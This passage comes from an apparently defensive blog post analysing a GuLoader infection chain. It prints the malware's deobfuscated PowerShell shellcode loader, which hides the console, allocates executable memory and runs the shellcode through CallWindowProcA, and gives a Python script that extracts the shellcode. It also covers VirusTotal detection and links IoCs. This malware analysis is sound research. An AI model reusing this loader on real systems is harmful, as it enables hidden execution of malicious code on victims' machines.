[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Claro05 &quot;kernel32&quot; &quot;GetConsoleWindow&quot;), (Claro04 @([IntPtr]) ([IntPtr])))&#x27;<br/>.(&#x27;IEX&#x27;) $Claro02<br/><br/># Invoke the GetConsoleWindow function pointer to get the window handle<br/>$Inspi937 = &#x27;$Shivunp = $Fingalb198.Invoke(0)&#x27;<br/>.(&#x27;IEX&#x27;) $Inspi937<br/><br/># Invoke the ShowWindow function pointer to show the window<br/>$Inspi937 = &#x27;$Efte.Invoke($Shivunp, 0)&#x27;<br/>.(&#x27;IEX&#x27;) $Inspi937<br/><br/># Retrieve the delegate for a native function pointer for the VirtualAlloc function from kernel32<br/>$Inspi936 = &#x27;$Klausulsai = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Claro05 &quot;kernel32&quot; &quot;VirtualAlloc&quot;), (Claro04 @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])))&#x27;<br/>.(&#x27;IEX&#x27;) $Inspi936<br/><br/># Retrieve the delegate for a native function pointer for the NtProtectVirtualMemory function from ntdll<br/>$Tonnesverb = Claro05 &#x27;ntdll&#x27; &#x27;NtProtectVirtualMemory&#x27;<br/><br/># Invoke the VirtualAlloc function pointer to allocate memory<br/>$Inspi937 = &#x27;$Industri3 = $Klausulsai.Invoke([IntPtr]::Zero, 645, 0x3000, 0x40)&#x27;<br/>.(&#x27;IEX&#x27;) $Inspi937<br/><br/># Invoke the VirtualAlloc function pointer to allocate memory<br/>$Inspi938 = &#x27;$veristfil = $Klausulsai.Invoke([IntPtr]::Zero, 43073536, 0x3000, 0x4)&#x27;<br/>.(&#x27;IEX&#x27;) $Inspi938<br/><br/># Copy the first shellcode to memory<br/>$jurym0 = &#x27;[System.Runtime.InteropServices.Marshal]::Copy($Hamart, 0,  $Industri3, 645)&#x27;<br/>.(&#x27;IEX&#x27;) $jurym0<br/><br/># Calculate the bytes of the second shellcode <br/>$Inspi939 = &#x27;$Unsyll=193539-645&#x27;<br/>.(&#x27;IEX&#x27;) $Inspi939<br/><br/># Copy the second shellcode to memory<br/>$jurym1 = &#x27;[System.Runtime.InteropServices.Marshal]::Copy($Hamart, 645, $veristfil, $Unsyll)&#x27;<br/>.(&#x27;IEX&#x27;) $jurym1<br/><br/>$jurym2 = &#x27;$Socialcent = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Claro05 &quot;USER32&quot; &quot;CallWindowProcA&quot;), (Claro04 @([IntPtr], [IntPtr], [IntPtr], [IntPtr], [IntPtr]) ([IntPtr])))&#x27;<br/>.(&#x27;IEX&#x27;) $jurym2<br/><br/># Execute the first shellcode in $Industri3 with the second shellcode $veristfil as an argument.<br/>$jurym3 = &#x27;$Socialcent.Invoke($Industri3,$veristfil,$Tonnesverb,0,0)&#x27;<br/>.(&#x27;IEX&#x27;) $jurym3</span></pre><p id="7a3c" class="pw-post-body-paragraph mh mi gu mj b mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd ne gn bk">I tried to comment on all important parts of the code in order to make it better understandable. A shoutout goes to <a class="af pe" href="https://twitter.com/dr4k0nia" rel="noopener ugc nofollow" target="_blank">Drakonia</a> for double-checking. In its essence, it&#x27;s a reflective shellcode loader to load the GuLoader shellcode. As already documented in other research, <a class="af pe" href="https://www.esentire.com/blog/guloader-vbscript-variant-returns-with-powershell-updates" rel="noopener ugc nofollow" target="_blank">the shellcode is split into two parts</a>. A decryptor that gets saved to the variable $Industri3 and the encrypted GuLoader shellcode, which gets stored into the variable $veristfil. Of note is that the shellcodes are both stored in the same file as the shellcode loader, which was initially downloaded in Stage 2. At execution, the script actually makes use of the variable $Hamart from the previous stage, which is the base64 decoded file content of the file stored as “opbrugenda.Dal”. To extract the shellcodes from this file, I wrote another Python script:</p><pre class="ni nj nk nl nm pg ph pi bp pj bb bk"><span id="4b8d" class="pk oh gu ph b bg pl pm l pn po">import base64<br/><br/># Read the content of the file<br/>filename = &quot;Path to Persuasive.inf/opbrugenda.Dal&quot;<br/>with open(filename, &#x27;r&#x27;) as file:<br/>    content = file.read()<br/><br/># Execute ($Milj37 = Get-Content $Advertize2)<br/>Milj37 = content.strip()<br/><br/># Convert from Base64<br/>Hamart = base64.b64decode(Milj37)<br/><br/># Extract $Industri3 and $veristfil<br/>Industri3 = Hamart[:645]<br/>veristfil = Hamart[645:193539]<br/><br/># Save $Industri3 to a file<br/>with open(&quot;Industri3.bin&quot;, &quot;wb&quot;) as file1:<br/>    file1.write(Industri3)<br/><br/># Save $veristfil to a file<br/>with open(&quot;veristfil.bin&quot;, &quot;wb&quot;) as file2:<br/>    file2.write(veristfil)<br/><br/># Get ASCII string<br/>Fald2 = Hamart.decode(&#x27;latin-1&#x27;)<br/><br/># Extract &quot;19271 Byte Payload&quot; starting at Byte 193539<br/>Rawnessa = Fald2[193539:193539+19271]<br/><br/># Print the extracted payload<br/>print(Rawnessa)<br/><br/># Save Rawnessa to a file<br/>with open(&quot;Rawnessa.bin&quot;, &quot;wb&quot;) as file3:<br/>    file3.write(Rawnessa.encode(&#x27;latin-1&#x27;))</span></pre><p id="5d50" class="pw-post-body-paragraph mh mi gu mj b mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd ne gn bk">Note that this code also stores the stage 3 PowerShell code to “Rawnessa.bin”.</p><p id="6d68" class="pw-post-body-paragraph mh mi gu mj b mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd ne gn bk">At this point, we now have successfully received and extracted the GuLoader Shellcode. As noted previously, the extracted shellcode stored in Industri3.bin is the decryptor, which would be executed with the shellcode stored as “veristfil.bin” as a parameter. The “Industri3.bin” would then decrypt the shellcode in“veristfil.bin” and execute its entry point.</p><p id="b41a" class="pw-post-body-paragraph mh mi gu mj b mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd ne gn bk">An excellent analysis of this shellcode and its behavior can be found here <a class="af pe" href="https://research.openanalysis.net/guloader/unicorn/emulation/anti-debug/debugging/config/2022/12/16/guloader.html#Guloader-Shellcode-Stage-1" rel="noopener ugc nofollow" target="_blank">https://research.openanalysis.net/guloader/unicorn/emulation/anti-debug/debugging/config/2022/12/16/guloader.html#Guloader-Shellcode-Stage-1</a></p><p id="5c07" class="pw-post-body-paragraph mh mi gu mj b mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd ne gn bk">As previously noted, I won’t go further into it.</p></div></div></div><div class="ab cb ny nz oa ob" role="separator"><span class="oc by bm od oe of"></span><span class="oc by bm od oe of"></span><span class="oc by bm od oe"></span></div><div class="gn go gp gq gr"><div class="ab cb"><div class="ci bh fz ga gb gc"><h2 id="ab3a" class="og oh gu bf oi oj ok dy ol om on ea oo ms op oq or mw os ot ou na ov ow ox oy bk">Additional findings (part 1)</h2><p id="1380" class="pw-post-body-paragraph mh mi gu mj b mk oz mm mn mo pa mq mr ms pb mu mv mw pc my mz na pd nc nd ne gn bk">After doing this analysis, I uploaded both shell codes to VirusTotal. They both had a 0/59 detection rate. This sparked a discussion on the detection of in-memory shellcode in the OAnalysis Discord server. It was pointed out that many antivirus software programs wouldn’t analyze shellcode when uploaded to VT as it would not be recognized as working code. I decided to append two screenshots of this conversation with permission of all involved entities below. I think they contain valuable insights and are worth a read:</p><figure class="ni nj nk nl nm nn nf ng paragraph-image"><div role="button" tabindex="0" class="no np fj nq bh nr"><div class="nf ng pw"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*6gaLUlpx2ZHudM7vFQxQ2g.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*6gaLUlpx2ZHudM7vFQxQ2g.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*6gaLUlpx2ZHudM7vFQxQ2g.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*6gaLUlpx2ZHudM7vFQxQ2g.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*6gaLUlpx2ZHudM7vFQxQ2g.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*6gaLUlpx2ZHudM7vFQxQ2g.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*6gaLUlpx2ZHudM7vFQxQ2g.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*6gaLUlpx2ZHudM7vFQxQ2g.png 640w, https://miro.medium.com/v2/resize:fit:720/1*6gaLUlpx2ZHudM7vFQxQ2g.png 720w, https://miro.medium.com/v2/resize:fit:750/1*6gaLUlpx2ZHudM7vFQxQ2g.png 750w, https://miro.medium.com/v2/resize:fit:786/1*6gaLUlpx2ZHudM7vFQxQ2g.png 786w, https://miro.medium.com/v2/resize:fit:828/1*6gaLUlpx2ZHudM7vFQxQ2g.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*6gaLUlpx2ZHudM7vFQxQ2g.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*6gaLUlpx2ZHudM7vFQxQ2g.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"/><img alt="" class="bh lo ns c" width="700" height="332" loading="eager" role="presentation"/></picture></div></div></figure><figure class="ni nj nk nl nm nn nf ng paragraph-image"><div role="button" tabindex="0" class="no np fj nq bh nr"><div class="nf ng px"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*pPlcH2TkZJWTKa9Lnp1S3w.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*pPlcH2TkZJWTKa9Lnp1S3w.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*pPlcH2TkZJWTKa9Lnp1S3w.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*pPlcH2TkZJWTKa9Lnp1S3w.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*pPlcH2TkZJWTKa9Lnp1S3w.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*pPlcH2TkZJWTKa9Lnp1S3w.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*pPlcH2TkZJWTKa9Lnp1S3w.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*pPlcH2TkZJWTKa9Lnp1S3w.png 640w, https://miro.medium.com/v2/resize:fit:720/1*pPlcH2TkZJWTKa9Lnp1S3w.png 720w, https://miro.medium.com/v2/resize:fit:750/1*pPlcH2TkZJWTKa9Lnp1S3w.png 750w, https://miro.medium.com/v2/resize:fit:786/1*pPlcH2TkZJWTKa9Lnp1S3w.png 786w, https://miro.medium.com/v2/resize:fit:828/1*pPlcH2TkZJWTKa9Lnp1S3w.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*pPlcH2TkZJWTKa9Lnp1S3w.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*pPlcH2TkZJWTKa9Lnp1S3w.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"/><img alt="" class="bh lo ns c" width="700" height="429" loading="eager" role="presentation"/></picture></div></div></figure><p id="a746" class="pw-post-body-paragraph mh mi gu mj b mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd ne gn bk">Tl;dr:</p><ol class=""><li id="6709" class="mh mi gu mj b mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd ne py pz qa bk">You can not expect random shell codes without context to be detected by VT.</li><li id="f483" class="mh mi gu mj b mk qb mm mn mo qc mq mr ms qd mu mv mw qe my mz na qf nc nd ne py pz qa bk">Performance plays a big role in AntiVirus creation, therefor running signatures on unknown file types that are not able to execute on their own is reduced.</li><li id="0557" class="mh mi gu mj b mk qb mm mn mo qc mq mr ms qd mu mv mw qe my mz na qf nc nd ne py pz qa bk">Scans can be file-type based to increase performance, which means only certain areas of a binary are scanned at all.</li></ol><p id="5f10" class="pw-post-body-paragraph mh mi gu mj b mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd ne gn bk">4. Uploading a shellcode as part of a PE might trigger detections that are not triggered when solely uploading the shellcode.</p><p id="3f01" class="pw-post-body-paragraph mh mi gu mj b mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd ne gn bk">I think those are important things to note when interpreting VirusTotal detection results.</p><p id="b5c7" class="pw-post-body-paragraph mh mi gu mj b mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd ne gn bk">Make sure to check out the involved people here: <a class="af pe" href="https://twitter.com/struppigel" rel="noopener ugc nofollow" target="_blank">struppigel</a>,<a class="af pe" href="https://twitter.com/herrcore" rel="noopener ugc nofollow" target="_blank"> herrcore</a>, <a class="af pe" href="https://twitter.com/lasq88" rel="noopener ugc nofollow" target="_blank">Lasq</a>.</p><h2 id="6749" class="og oh gu bf oi oj ok dy ol om on ea oo ms op oq or mw os ot ou na ov ow ox oy bk">Additional Findings (part 2)</h2><p id="7a69" class="pw-post-body-paragraph mh mi gu mj b mk oz mm mn mo pa mq mr ms pb mu mv mw pc my mz na pd nc nd ne gn bk">When writing this blogpost I actually discovered that this sample was initially discussed by <a class="af pe" href="https://twitter.com/malware_traffic" rel="noopener ugc nofollow" target="_blank">Brad Duncan</a> in a SANS diary. From his analysis, I was also able to recover the full infection chain as presented in Figure 1, and identify the final payload of this infection which was Remcos Rat.</p><p id="2c8b" class="pw-post-body-paragraph mh mi gu mj b mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd ne gn bk">Make sure to check out his work here: <a class="af pe" href="https://isc.sans.edu/diary/29990" rel="noopener ugc nofollow" target="_blank">https://isc.sans.edu/diary/29990</a></p></div></div></div><div class="ab cb ny nz oa ob" role="separator"><span class="oc by bm od oe of"></span><span class="oc by bm od oe of"></span><span class="oc by bm od oe"></span></div><div class="gn go gp gq gr"><div class="ab cb"><div class="ci bh fz ga gb gc"><h2 id="9713" class="og oh gu bf oi oj ok dy ol om on ea oo ms op oq or mw os ot ou na ov ow ox oy bk">Addition Reading for interested minds:</h2><p id="23b6" class="pw-post-body-paragraph mh mi gu mj b mk oz mm mn mo pa mq mr ms pb mu mv mw pc my mz na pd nc nd ne gn bk"><a class="af pe" href="https://isc.sans.edu/diary/GuLoader+or+DBatLoaderModiLoaderstyle+infection+for+Remcos+RAT/29990" rel="noopener ugc nofollow" target="_blank">https://isc.sans.edu/diary/GuLoader+or+DBatLoaderModiLoaderstyle+infection+for+Remcos+RAT/29990</a></p><p id="0f1f" class="pw-post-body-paragraph mh mi gu mj b mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd ne gn bk"><a class="af pe" href="https://www.esentire.com/blog/guloader-vbscript-variant-returns-with-powershell-updates" rel="noopener ugc nofollow" target="_blank">https://www.esentire.com/blog/guloader-vbscript-variant-returns-with-powershell-updates</a></p><p id="7a25" class="pw-post-body-paragraph mh mi gu mj b mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd ne gn bk"><a class="af pe" href="https://research.openanalysis.net/guloader/unicorn/emulation/anti-debug/debugging/config/2022/12/16/guloader.html" rel="noopener ugc nofollow" target="_blank">https://research.openanalysis.net/guloader/unicorn/emulation/anti-debug/debugging/config/2022/12/16/guloader.html</a></p></div></div></div><div class="ab cb ny nz oa ob" role="separator"><span class="oc by bm od oe of"></span><span class="oc by bm od oe of"></span><span class="oc by bm od oe"></span></div><div class="gn go gp gq gr"><div class="ab cb"><div class="ci bh fz ga gb gc"><h1 id="d405" class="qg oh gu bf oi qh qi qj ol qk ql qm oo qn qo qp qq qr qs qt qu qv qw qx qy qz bk">IoC:</h1><p id="cfc4" class="pw-post-body-paragraph mh mi gu mj b mk oz mm mn mo pa mq mr ms pb mu mv mw pc my mz na pd nc nd ne gn bk">All IoC for this campaign can be found here: <a class="af pe" href="https://github.com/Gi7w0rm/MalwareConfigLists/blob/main/GuLoader/GuLoader_From_lnk_to_Shellcode.txt" rel="noopener ugc nofollow" target="_blank">https://github.com/Gi7w0rm/MalwareConfigLists/blob/main/GuLoader/GuLoader_From_lnk_to_Shellcode.txt</a></p><p id="c0da" class="pw-post-body-paragraph mh mi gu mj b mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd ne gn bk">If you made it here, thank you for reading this. It means a lot to me.<br/>Make sure to follow my <a class="af pe" href="https://twitter.com/Gi7w0rm" rel="noopener ugc nofollow" target="_blank">socials</a> if you want more cybersecurity content or support my work via <a class="af pe" href="https://ko-fi.com/gi7w0rm" rel="noopener ugc nofollow" target="_blank">Kofi</a>. Until the next one. <br/>Cheers ❤</p></div></div></div></div></section></div></div></article></div><div class="ab cb"><div class="ci bh fz ga gb gc"><div class="ra rb ab iv"><div class="rc ab"><a class="rd ay am ao" href="https://medium.com/tag/cybersecurity?source=post_page-----4b5f1d6d877--------------------------------" rel="noopener follow"><div class="re fj cx rf ge rg rh bf b bg z bk ri">Cybersecurity</div></a></div><div class="rc ab"><a class="rd ay am ao" href="https://medium.com/tag/guloader?source=post_page-----4b5f1d6d877--------------------------------" rel="noopener follow"><div class="re fj cx rf ge rg rh bf b bg z bk ri">Guloader</div></a></div><div class="rc ab"><a class="rd ay am ao" href="https://medium.com/tag/reverse-engineering?source=post_page-----4b5f1d6d877--------------------------------" rel="noopener follow"><div class="re fj cx rf ge rg rh bf b bg z bk ri">Reverse Engineering</div></a></div><div class="rc ab"><a class="rd ay am ao" href="https://medium.com/tag/cyber-threat-intelligence?source=post_page-----4b5f1d6d877--------------------------------" rel="noopener follow"><div class="re fj cx rf ge rg rh bf b bg z bk ri">Cyber Threat Intelligence</div></a></div><div class="rc ab"><a class="rd ay am ao" href="https://medium.com/tag/malware?source=post_page-----4b5f1d6d877--------------------------------" rel="noopener follow"><div class="re fj cx rf ge rg rh bf b bg z bk ri">Malware</div></a></div></div></div></div><div class="l"></div><footer class="rj rk rl rm rn ro rp rq rr ab q rs rt c"><div class="l ae"><div class="ab cb"><div class="ci bh fz ga gb gc"><div class="ab cp ru"><div class="ab q ke"><div class="rv l"><span class="l rw rx ry e d"><div class="ab q ke kf"><div class="pw-multi-vote-icon fj kg kh ki kj"><span><a class="af ag ah ai aj ak al am an ao ap aq ar as at" data-testid="footerClapButton" href="https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fvote%2Fp%2F4b5f1d6d877&amp;operation=register&amp;redirect=https%3A%2F%2Fgi7w0rm.medium.com%2Fcloudeye-from-lnk-to-shellcode-4b5f1d6d877&amp;user=Gi7w0rm&amp;userId=fa7639fc99f0&amp;source=---footer_actions--4b5f1d6d877---------------------clap_footer-----------" rel="noopener follow"><div><div class="bm" aria-hidden="false"><div class="kk ao kl km kn ko am kp kq kr kj"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" aria-label="clap"><path fill-rule="evenodd" d="M11.37.828 12 3.282l.63-2.454zM13.916 3.953l1.523-2.112-1.184-.39zM8.589 1.84l1.522 2.112-.337-2.501zM18.523 18.92c-.86.86-1.75 1.246-2.62 1.33a6 6 0 0 0 .407-.372c2.388-2.389 2.86-4.951 1.399-7.623l-.912-1.603-.79-1.672c-.26-.56-.194-.98.203-1.288a.7.7 0 0 1 .546-.132c.283.046.546.231.728.5l2.363 4.157c.976 1.624 1.141 4.237-1.324 6.702m-10.999-.438L3.37 14.328a.828.828 0 0 1 .585-1.408.83.83 0 0 1 .585.242l2.158 2.157a.365.365 0 0 0 .516-.516l-2.157-2.158-1.449-1.449a.826.826 0 0 1 1.167-1.17l3.438 3.44a.363.363 0 0 0 .516 0 .364.364 0 0 0 0-.516L5.293 9.513l-.97-.97a.826.826 0 0 1 0-1.166.84.84 0 0 1 1.167 0l.97.968 3.437 3.436a.36.36 0 0 0 .517 0 .366.366 0 0 0 0-.516L6.977 7.83a.82.82 0 0 1-.241-.584.82.82 0 0 1 .824-.826c.219 0 .43.087.584.242l5.787 5.787a.366.366 0 0 0 .587-.415l-1.117-2.363c-.26-.56-.194-.98.204-1.289a.7.7 0 0 1 .546-.132c.283.046.545.232.727.501l2.193 3.86c1.302 2.38.883 4.59-1.277 6.75-1.156 1.156-2.602 1.627-4.19 1.367-1.418-.236-2.866-1.033-4.079-2.246M10.75 5.971l2.12 2.12c-.41.502-.465 1.17-.128 1.89l.22.465-3.523-3.523a.8.8 0 0 1-.097-.368c0-.22.086-.428.241-.584a.847.847 0 0 1 1.167 0m7.355 1.705c-.31-.461-.746-.758-1.23-.837a1.44 1.44 0 0 0-1.11.275c-.312.24-.505.543-.59.881a1.74 1.74 0 0 0-.906-.465 1.47 1.47 0 0 0-.82.106l-2.182-2.182a1.56 1.56 0 0 0-2.2 0 1.54 1.54 0 0 0-.396.701 1.56 1.56 0 0 0-2.21-.01 1.55 1.55 0 0 0-.416.753c-.624-.624-1.649-.624-2.237-.037a1.557 1.557 0 0 0 0 2.2c-.239.1-.501.238-.715.453a1.56 1.56 0 0 0 0 2.2l.516.515a1.556 1.556 0 0 0-.753 2.615L7.01 19c1.32 1.319 2.909 2.189 4.475 2.449q.482.08.971.08c.85 0 1.653-.198 2.393-.579.231.033.46.054.686.054 1.266 0 2.457-.52 3.505-1.567 2.763-2.763 2.552-5.734 1.439-7.586z" clip-rule="evenodd"></path></svg></div></div></div></a></span></div><div class="pw-multi-vote-count l ks kt ku kv kw kx ky"><p class="bf b dv z du"><span class="kz">--</span></p></div></div></span><span class="l h g f rz sa"><div class="ab q ke kf"><div class="pw-multi-vote-icon fj kg kh ki kj"><span><a class="af ag ah ai aj ak al am an ao ap aq ar as at" data-testid="footerClapButton" href="https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fvote%2Fp%2F4b5f1d6d877&amp;operation=register&amp;redirect=https%3A%2F%2Fgi7w0rm.medium.com%2Fcloudeye-from-lnk-to-shellcode-4b5f1d6d877&amp;user=Gi7w0rm&amp;userId=fa7639fc99f0&amp;source=---footer_actions--4b5f1d6d877---------------------clap_footer-----------" rel="noopener follow"><div><div class="bm" aria-hidden="false"><div class="kk ao kl km kn ko am kp kq kr kj"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" aria-label="clap"><path fill-rule="evenodd" d="M11.37.828 12 3.282l.63-2.454zM13.916 3.953l1.523-2.112-1.184-.39zM8.589 1.84l1.522 2.112-.337-2.501zM18.523 18.92c-.86.86-1.75 1.246-2.62 1.33a6 6 0 0 0 .407-.372c2.388-2.389 2.86-4.951 1.399-7.623l-.912-1.603-.79-1.672c-.26-.56-.194-.98.203-1.288a.7.7 0 0 1 .546-.132c.283.046.546.231.728.5l2.363 4.157c.976 1.624 1.141 4.237-1.324 6.702m-10.999-.438L3.37 14.328a.828.828 0 0 1 .585-1.408.83.83 0 0 1 .585.242l2.158 2.157a.365.365 0 0 0 .516-.516l-2.157-2.158-1.449-1.449a.826.826 0 0 1 1.167-1.17l3.438 3.44a.363.363 0 0 0 .516 0 .364.364 0 0 0 0-.516L5.293 9.513l-.97-.97a.826.826 0 0 1 0-1.166.84.84 0 0 1 1.167 0l.97.968 3.437 3.436a.36.36 0 0 0 .517 0 .366.366 0 0 0 0-.516L6.977 7.83a.82.82 0 0 1-.241-.584.82.82 0 0 1 .824-.826c.219 0 .43.087.584.242l5.787 5.787a.366.366 0 0 0 .587-.415l-1.117-2.363c-.26-.56-.194-.98.204-1.289a.7.7 0 0 1 .546-.132c.283.046.545.232.727.501l2.193 3.86c1.302 2.38.883 4.59-1.277 6.75-1.156 1.156-2.602 1.627-4.19 1.367-1.418-.236-2.866-1.033-4.079-2.246M10.75 5.971l2.12 2.12c-.41.502-.465 1.17-.128 1.89l.22.465-3.523-3.523a.8.8 0 0 1-.097-.368c0-.22.086-.428.241-.584a.847.847 0 0 1 1.167 0m7.355 1.705c-.31-.461-.746-.758-1.23-.837a1.44 1.44 0 0 0-1.11.275c-.312.24-.505.543-.59.881a1.74 1.74 0 0 0-.906-.465 1.47 1.47 0 0 0-.82.106l-2.182-2.182a1.56 1.56 0 0 0-2.2 0 1.54 1.54 0 0 0-.396.701 1.56 1.56 0 0 0-2.21-.01 1.55 1.55 0 0 0-.416.753c-.624-.624-1.649-.624-2.237-.037a1.557 1.557 0 0 0 0 2.2c-.239.1-.501.238-.715.453a1.56 1.56 0 0 0 0 2.2l.516.515a1.556 1.556 0 0 0-.753 2.615L7.01 19c1.32 1.319 2.909 2.189 4.475 2.449q.482.08.971.08c.85 0 1.653-.198 2.393-.579.231.033.46.054.686.054 1.266 0 2.457-.52 3.505-1.567 2.763-2.763 2.552-5.734 1.439-7.586z" clip-rule="evenodd"></path></svg></div></div></div></a></span></div><div class="pw-multi-vote-count l ks kt ku kv kw kx ky"><p class="bf b dv z du"><span class="kz">--</span></p></div></div></span></div><div class="bq ab"><div><div class="bm" aria-hidden="false"><button class="ao kk lc ld ab q fk le lf" aria-label="responses"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" class="lb"><path d="M18.006 16.803c1.533-1.456 2.234-3.325 2.234-5.321C20.24 7.357 16.709 4 12.191 4S4 7.357 4 11.482c0 4.126 3.674 7.482 8.191 7.482.817 0 1.622-.111 2.393-.327.231.2.48.391.744.559 1.06.693 2.203 1.044 3.399 1.044.224-.008.4-.112.486-.287a.49.49 0 0 0-.042-.518c-.495-.67-.845-1.364-1.04-2.057a4 4 0 0 1-.125-.598zm-3.122 1.055-.067-.223-.315.096a8 8 0 0 1-2.311.338c-4.023 0-7.292-2.955-7.292-6.587 0-3.633 3.269-6.588 7.292-6.588 4.014 0 7.112 2.958 7.112 6.593 0 1.794-.608 3.469-2.027 4.72l-.195.168v.255c0 .056 0 .151.016.295.025.231.081.478.154.733.154.558.398 1.117.722 1.659a5.3 5.3 0 0 1-2.165-.845c-.276-.176-.714-.383-.941-.59z"></path></svg><p class="bf b bg z du"><span class="pw-responses-count la lb">1</span></p></button></div></div></div></div><div class="ab q"><div class="of l is"><div><div class="bm" aria-hidden="false"><span><a class="af ag ah ai aj ak al am an ao ap aq ar as at" data-testid="footerBookmarkButton" href="https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fbookmark%2Fp%2F4b5f1d6d877&amp;operation=register&amp;redirect=https%3A%2F%2Fgi7w0rm.medium.com%2Fcloudeye-from-lnk-to-shellcode-4b5f1d6d877&amp;source=---footer_actions--4b5f1d6d877---------------------bookmark_footer-----------" rel="noopener follow"><svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" fill="none" viewBox="0 0 25 25" class="du lh" aria-label="Add to list bookmark button"><path fill="currentColor" d="M18 2.5a.5.5 0 0 1 1 0V5h2.5a.5.5 0 0 1 0 1H19v2.5a.5.5 0 1 1-1 0V6h-2.5a.5.5 0 0 1 0-1H18zM7 7a1 1 0 0 1 1-1h3.5a.5.5 0 0 0 0-1H8a2 2 0 0 0-2 2v14a.5.5 0 0 0 .805.396L12.5 17l5.695 4.396A.5.5 0 0 0 19 21v-8.5a.5.5 0 0 0-1 0v7.485l-5.195-4.012a.5.5 0 0 0-.61 0L7 19.985z"></path></svg></a></span></div></div></div><div class="of l is"><div class="bm" aria-hidden="false" aria-describedby="postFooterSocialMenu" aria-labelledby="postFooterSocialMenu"><div><div class="bm" aria-hidden="false"><button aria-controls="postFooterSocialMenu" aria-expanded="false" aria-label="Share Post" data-testid="footerSocialShareButton" class="af fk ah ai aj ak al lp an ao ap ex lq lr lf ls"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M15.218 4.931a.4.4 0 0 1-.118.132l.012.006a.45.45 0 0 1-.292.074.5.5 0 0 